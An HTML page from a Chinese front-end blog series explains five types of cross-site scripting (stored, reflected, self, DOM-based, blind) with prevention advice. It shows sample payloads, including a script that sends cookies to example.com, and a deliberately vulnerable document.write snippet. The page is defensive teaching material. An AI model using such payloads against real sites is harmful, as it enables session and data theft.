<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>概述 | 葱白的工具箱</title>
    <meta name="generator" content="VuePress 1.8.2">
    
    <meta name="description" content="Hello World">
    
    <link rel="preload" href="/feblog/assets/css/0.styles.90641447.css" as="style"><link rel="preload" href="/feblog/assets/js/app.af16a26a.js" as="script"><link rel="preload" href="/feblog/assets/js/2.bb248851.js" as="script"><link rel="preload" href="/feblog/assets/js/25.db370b93.js" as="script"><link rel="prefetch" href="/feblog/assets/js/10.1e7b7348.js"><link rel="prefetch" href="/feblog/assets/js/11.5df11de0.js"><link rel="prefetch" href="/feblog/assets/js/12.0cb13daa.js"><link rel="prefetch" href="/feblog/assets/js/13.b7203228.js"><link rel="prefetch" href="/feblog/assets/js/14.0d1b8841.js"><link rel="prefetch" href="/feblog/assets/js/15.40482005.js"><link rel="prefetch" href="/feblog/assets/js/16.975967de.js"><link rel="prefetch" href="/feblog/assets/js/17.80e3a75b.js"><link rel="prefetch" href="/feblog/assets/js/18.f8871089.js"><link rel="prefetch" href="/feblog/assets/js/19.9ccf9155.js"><link rel="prefetch" href="/feblog/assets/js/20.4f05958f.js"><link rel="prefetch" href="/feblog/assets/js/21.2532e6ba.js"><link rel="prefetch" href="/feblog/assets/js/22.10fa876d.js"><link rel="prefetch" href="/feblog/assets/js/23.9adf1998.js"><link rel="prefetch" href="/feblog/assets/js/24.8d4a2693.js"><link rel="prefetch" href="/feblog/assets/js/26.f32df43c.js"><link rel="prefetch" href="/feblog/assets/js/27.15cd01b9.js"><link rel="prefetch" href="/feblog/assets/js/28.6a8a79bd.js"><link rel="prefetch" href="/feblog/assets/js/29.3b89a9ef.js"><link rel="prefetch" href="/feblog/assets/js/3.bd55a964.js"><link rel="prefetch" href="/feblog/assets/js/30.921b4f31.js"><link rel="prefetch" href="/feblog/assets/js/31.3494180c.js"><link rel="prefetch" href="/feblog/assets/js/32.50330ec3.js"><link rel="prefetch" href="/feblog/assets/js/33.f0880d8a.js"><link rel="prefetch" href="/feblog/assets/js/34.e0057bb1.js"><link rel="prefetch" href="/feblog/assets/js/35.7703da2a.js"><link rel="prefetch" href="/feblog/assets/js/36.faf60c12.js"><link rel="prefetch" href="/feblog/assets/js/37.405fda0a.js"><link rel="prefetch" href="/feblog/assets/js/38.1e542b1a.js"><link rel="prefetch" href="/feblog/assets/js/39.64acf374.js"><link rel="prefetch" href="/feblog/assets/js/4.719e49fe.js"><link rel="prefetch" href="/feblog/assets/js/5.b7269ca1.js"><link rel="prefetch" href="/feblog/assets/js/6.004ca1a2.js"><link rel="prefetch" href="/feblog/assets/js/7.0bb92c79.js"><link rel="prefetch" href="/feblog/assets/js/8.e350d733.js"><link rel="prefetch" href="/feblog/assets/js/9.bd5a10e4.js">
    <link rel="stylesheet" href="/feblog/assets/css/0.styles.90641447.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/feblog/" class="home-link router-link-active"><!----> <span class="site-name">葱白的工具箱</span></a> <div class="links"><!----> <nav class="nav-links can-hide"><div class="nav-item"><a href="/feblog/" class="nav-link">
  Coding集
</a></div><div class="nav-item"><a href="/feblog/book/" class="nav-link">
  披星集
</a></div><div class="nav-item"><a href="/feblog/atrcile/" class="nav-link">
  荷锄集
</a></div><div class="nav-item"><a href="/feblog/han/" class="nav-link">
  锄月集
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/feblog/" class="nav-link">
  Coding集
</a></div><div class="nav-item"><a href="/feblog/book/" class="nav-link">
  披星集
</a></div><div class="nav-item"><a href="/feblog/atrcile/" class="nav-link">
  荷锄集
</a></div><div class="nav-item"><a href="/feblog/han/" class="nav-link">
  锄月集
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>与JS共舞</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/feblog/howjswork/1.html" class="sidebar-link">1.引擎，运行时，调用栈概述</a></li><li><a href="/feblog/howjswork/2.html" class="sidebar-link">2.V8 引擎中书写最优代码的 5 条小技巧</a></li><li><a href="/feblog/howjswork/3.html" class="sidebar-link">3.内存管理以及常见的内存泄漏处理</a></li><li><a href="/feblog/howjswork/4.html" class="sidebar-link">4.Event loop和异步编程</a></li><li><a href="/feblog/howjswork/5.html" class="sidebar-link">5.WebSockets 和HTTP2的正确姿势</a></li><li><a href="/feblog/howjswork/6.html" class="sidebar-link">6.WebAssembly以及使用它的场景</a></li><li><a href="/feblog/howjswork/7.html" class="sidebar-link">7.WebWorker和5个使用场景</a></li><li><a href="/feblog/howjswork/8.html" class="sidebar-link">8.Service Workers 的生命周期和使用场景</a></li><li><a href="/feblog/howjswork/9.html" class="sidebar-link">9.网页推送机制</a></li><li><a href="/feblog/howjswork/10.html" class="sidebar-link">10.使用MutationObserver 跟踪 DOM 变化</a></li><li><a href="/feblog/howjswork/11.html" class="sidebar-link">11.渲染引擎以及性能优化建议</a></li><li><a href="/feblog/howjswork/12.html" class="sidebar-link">12.网络层内部，以及性能，安全性的优化</a></li><li><a href="/feblog/howjswork/13.html" class="sidebar-link">13.CSS和JS动画以及优化建议</a></li><li><a href="/feblog/howjswork/14.html" class="sidebar-link">14.AST和优化建议</a></li><li><a href="/feblog/howjswork/15.html" class="sidebar-link">15.类，继承，Babel和TS的转换</a></li><li><a href="/feblog/howjswork/16.html" class="sidebar-link">16.存储引擎以及使用场景</a></li><li><a href="/feblog/howjswork/17.html" class="sidebar-link">17.影子DOM 内部构造及如何构建独立组件</a></li><li><a href="/feblog/howjswork/18.html" class="sidebar-link">18.WebRTC 及点对点网络通信机制</a></li><li><a href="/feblog/howjswork/19.html" class="sidebar-link">19.自定义元素机制</a></li><li><a href="/feblog/howjswork/20.html" class="sidebar-link">20.JS的异常处理以及在异步中处理异常的办法</a></li><li><a href="/feblog/howjswork/21.html" aria-current="page" class="active sidebar-link">21.XSS的5种方式和防范策略</a></li><li><a href="/feblog/howjswork/22.html" class="sidebar-link">22.CRFS攻击以及7种防范策略</a></li><li><a href="/feblog/howjswork/23.html" class="sidebar-link">23.迭代器以及如何获得比generator更高的控制权</a></li><li><a href="/feblog/howjswork/24.html" class="sidebar-link">24.加密和中间人（MITM）攻击</a></li><li><a href="/feblog/howjswork/25.html" class="sidebar-link">25.函数式编程和基本概念</a></li><li><a href="/feblog/howjswork/26.html" class="sidebar-link">26.多态的3种类型</a></li><li><a href="/feblog/howjswork/28.html" class="sidebar-link">28.Deno 一瞥</a></li><li><a href="/feblog/howjswork/29.html" class="sidebar-link">29.JS设计模式</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="概述"><a href="#概述" class="header-anchor">#</a> 概述</h1> <p>跨站脚本（XSS）是浏览器侧进行的代码注入类的攻击方式。攻击者把木马代码注入到应用中，然后在特殊的场景下出发执行。</p> <p>比如浏览器，攻击者会把代码注入到受害者使用的web应用中。一般来说，XSS攻击都是因为使用者对使用的web应用过度的信任。</p> <p>JS是运行在受限的环境中的，不能访问用户的操作系统。因此XSS攻击不会损坏受害者的计算机。XSS攻击的目的往往是窃取私人信息。</p> <p>XSS攻击主要有5种方式</p> <h1 id="存储型-stored-xss"><a href="#存储型-stored-xss" class="header-anchor">#</a> 存储型 (Stored) XSS</h1> <p>当web应用会存储用户输入的内容时，可能会发生存储型XSS攻击。在保持数据瘴之前，前端和后端都没有进行数据验证，就会产生严重的漏洞。如果应用加载了已经存储的数据，并将其嵌入到HTML响应页面时，代码注入就有了可乘之机。</p> <p>这种攻击方式已经很少了，因为这种漏洞现在不多了并且很难找到了。</p> <p>但是另一方面来说，XSS攻击的影响时很大的。一旦木马数据存在了服务，就可能被所用人使用。用户不用做任何的东动作---比如点击可疑链接等，木马就已经植入到你的应用中了。</p> <p>存储型XSS攻击需要两个请求：</p> <p>1.一个请求用来注入并保存木马到应用的服务器</p> <ol><li>一个请求用来加载存储的木马，并嵌入到发布的HTML页面种</li></ol> <p>允许用户分享内容的网站更容易遭到存储型XSS的攻击。比如社交网站和论坛。</p> <h2 id="example"><a href="#example" class="header-anchor">#</a> Example</h2> <p>加入攻击者在社交网络种发现了发布评论的功能有漏洞。这个漏洞是网站页面渲染了评论的未处理过的内容。</p> <p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ca87f28d05a7487188764b54396e07eb~tplv-k3u1fbpfcp-watermark.image" alt="image.png">
这样，攻击者就可以在评论中添加这样一个自定义脚本</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;script&gt; window.location = ‘https://example.com/?user_data=’ + document.cookies; &lt;/script&gt;
</code></pre></div><p>一旦网站加载这个评论，就会把<code>script</code>标签加入到HTMl页面中。那么就会把用户的URL重定向到木马网站，然后通过url的查询参数发送所有的cookies信息。这样木马网站就窃取了cookie和隐私数据。</p> <p>因为很多人都可以看你的评论，所以他们都可能受到攻击。</p> <p>这个案例比较粗糙，我们不希望任何的社交网站有这么低级的漏洞，它只是用来简单的说明存储型XSS攻击。</p> <h2 id="预防"><a href="#预防" class="header-anchor">#</a> 预防</h2> <p>防止存储型XSS最有效的途径，是在保存之前要确保所有的用户输入是纯净的。</p> <p>一般通过字符串检查和转义来保证内容无害。</p> <h1 id="反射型-xss"><a href="#反射型-xss" class="header-anchor">#</a> 反射型 XSS</h1> <p>浏览器向服务器发送的数据，又被服务器包在回应中发回来了的时候，就可能发生反射型XSS</p> <p>这种攻击被称为反射，是因为木马脚本是从web应用上反射到受害者浏览器的。</p> <p>脚本通过链接触发，这个链接给web应用发送了请求，这个请求携带了一个能够执行恶意脚本的漏洞。</p> <p>和存储型XSS不同，反射型的XSS代码不会保存在服务器中，它只要求恶意脚本嵌入在URL中。</p> <p>存储型XSS会自动攻击访问页面的所有用户，而反射型只会攻击点击了恶意链接的终端用户</p> <h2 id="example-2"><a href="#example-2" class="header-anchor">#</a> Example</h2> <p>假如现在有一个搜索功能，它的工作机制如下：</p> <ul><li>用户输入了搜索关键字</li> <li>web应用将关键字作为查询参数，然后将用户重定向到结果页面</li> <li>关键字被传递到服务器进行查询</li> <li>查询结束之后，服务器响应页面。响应内容中包含了搜索的关键字，以及匹配的结果。
如果用户输入了“javascript” ，就会重定向到下面这个页面：</li></ul> <p><code>https://example.com/search/?term=javascript</code></p> <p>查询结束之后，页面会渲染服务端的响应：</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;div&gt; You searched for: javascript &lt;/div&gt;
&lt;div&gt; Results: &lt;/div&gt;
…
</code></pre></div><p>如果web应用没有对搜索关键字执行任何处理或验证，攻击者就可以在关键字中植入恶意代码：</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;script&gt;/*Malicious code*/&lt;/script&gt;
</code></pre></div><p>生成的URL 会是这样:</p> <p><code>https://example.com/search/?term=&lt;script&gt;/*+Malicious+code+*/&lt;/script&gt;</code></p> <p>页面渲染:</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;div&gt; You searched for: &lt;script&gt;/*Malicious code*/&lt;/script&gt; &lt;/div&gt;
&lt;div&gt; Results: &lt;/div&gt;
…
</code></pre></div><p>如果把这个URL传播给其他用户，那么攻击者的脚本就会在他们的浏览器中执行。</p> <p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b5afa513e21d45afbd46b8659b09da7c~tplv-k3u1fbpfcp-watermark.image" alt="image.png">
传播恶意URL的方式有很多，包括把它放置在攻击者控制的网站中，或者允许生成内容的网站，通过邮件发送等等。这种攻击可以是部分人群，也可以无差别的针对任意用户</p> <h2 id="预防-2"><a href="#预防-2" class="header-anchor">#</a> 预防</h2> <p>只要保持警惕，就能预防反射型XSS。特别是，不要点击可疑的连接。
和存储型XSS一样的是，保证用户输入的纯净，就可以预防反射型XSS</p> <h1 id="self-xss"><a href="#self-xss" class="header-anchor">#</a> Self-XSS</h1> <p>Self-XSS 有点类似于反射XSS。不同点是Self-XSS不能通过特殊的URL来触发。Self-XSS只能由受害者在自己的浏览器中触发。</p> <p>这样听起来没那么危险。但是并不是这样。Self-XSS通过社会工程传播。在信息安全的上下文，社会工程是指执行操作的人精神控制，会对人群有潜在的负面影响。</p> <h2 id="example-3"><a href="#example-3" class="header-anchor">#</a> Example</h2> <p>一种常见的方式，是让受害者粘贴一些恶意代码到浏览器的控制台。这样攻击者可以从cookie，DOM中获取所有的信息。</p> <p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7517abf1390a4dfd93a95d7361e2f247~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p> <h2 id="预防-3"><a href="#预防-3" class="header-anchor">#</a> 预防</h2> <p>Self-XSS 只能靠用户的警惕性来预防。开发者是无法侦测或者阻塞浏览器控制台中执行的代码的。
一些流行的网站会在浏览器的控制台放置警告信息，来阻止用户在这里执行代码。</p> <p>浏览器厂商也在采取一些安全措施来警告用户Self-XSS攻击的风险</p> <h1 id="dom-based-xss"><a href="#dom-based-xss" class="header-anchor">#</a> DOM-based XSS</h1> <p>当web应用动态修改DOM的时候可能发生DOM-based XSS攻击，恶意代码在运行时被应用自己注入。
为了触发DOM-based XSS ,网站的JS 代码需要从攻击者控制的资源上获取输入，比如浏览器中的URL</p> <h2 id="example-4"><a href="#example-4" class="header-anchor">#</a> Example</h2> <p>看下面的例子</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;html&gt; 

&lt;head&gt;                                                                    
  &lt;title&gt; Dashboard &lt;/title&gt;                                                
&lt;/head&gt;                                                                   
&lt;body&gt;                                                                    
 &lt;script&gt;                                                                  
    let startPosition = document.URL.indexOf(&quot;role=&quot;) + 5;                    
    let userRole = document.URL.substring(startPosition,document.URL.length); 
    document.write(userRole);                                                 
 &lt;/script&gt;                                                                 
 &lt;/body&gt;                                                                   
&lt;/html&gt;
</code></pre></div><p>页面中的脚本从<code>role</code>参数中获取值，并插入到DOM中。</p> <p>攻击者就可以将查询参数设置为恶意代码，然后被注入到DOM中</p> <p><code>https://example.com/?role=&lt;script&gt;/*Malicious+code*/&lt;/script&gt;</code></p> <p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8fe1caf1a7ae49d48cc68054dfa6ccef~tplv-k3u1fbpfcp-watermark.image" alt="image.png"></p> <p>在这个案例中，虽然web应用对这种攻击很无力，但是服务端是可以探查到的，因为它是请求的URL的一部分。如果服务端有安全机制，就能避免这种攻击。</p> <p>可以使用URL片段的技术来阻止它发送到服务器。URL片段是URL中<code>#</code> 符号之后的内容，它不会发送给服务端。
这样的话，就可以修改上面的URL：</p> <p><code>https://example.com/#role=&lt;script&gt;/*Malicious+code*/&lt;/script&gt;</code></p> <p>这样，恶意脚本就不会发送到浏览器了。</p> <h2 id="预防-4"><a href="#预防-4" class="header-anchor">#</a> 预防</h2> <p>所有依赖用户输入的DOM操作和重定向都应该净化。而且应该是客户端来做净化操作，因为DOM-based XSS 不能在服务端被禁止</p> <p>当然，用户的警惕性必不可少。当用户点击一个URL或者输入数据时，都应该小心有恶意代码</p> <h1 id="blind-xss"><a href="#blind-xss" class="header-anchor">#</a> Blind XSS</h1> <p>Blind XSS 是存储型XSS的一种。他们执行的方式一样。</p> <p>不同的是恶意代码在应用的另一个部分，或者干脆在一个完全不同的应用中渲染和执行。这两种场景下，攻击者都没有访问受害的页面。</p> <h2 id="example-5"><a href="#example-5" class="header-anchor">#</a> Example</h2> <p>Blind XSS 的一个例子是，攻击者在用户反馈页面注入了恶意代码。当应用的管理者打开反馈控制面板，恶意代码就执行了。</p> <p>攻击者的恶意代码可以保存在服务器中，无论过了多久，只要当管理员访问控制面板页面就会执行。</p> <p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ae9c648d0a3940a9b571dbea7b744760~tplv-k3u1fbpfcp-watermark.image" alt="image.png">
另一种场景是日志记录，比如异常的处理日志。攻击者使用日志API，输出一些恶意代码而不是一个异常。在异常处理情况的控制面板中，恶意代码被渲染和执行。</p> <h2 id="prevention"><a href="#prevention" class="header-anchor">#</a> Prevention</h2> <p>Blind XSS 的预防方式跟存储型XSS一样。</p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/feblog/howjswork/20.html" class="prev">
        20.JS的异常处理以及在异步中处理异常的办法
      </a></span> <span class="next"><a href="/feblog/howjswork/22.html">
        22.CRFS攻击以及7种防范策略
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/feblog/assets/js/app.af16a26a.js" defer></script><script src="/feblog/assets/js/2.bb248851.js" defer></script><script src="/feblog/assets/js/25.db370b93.js" defer></script>
  </body>
</html>
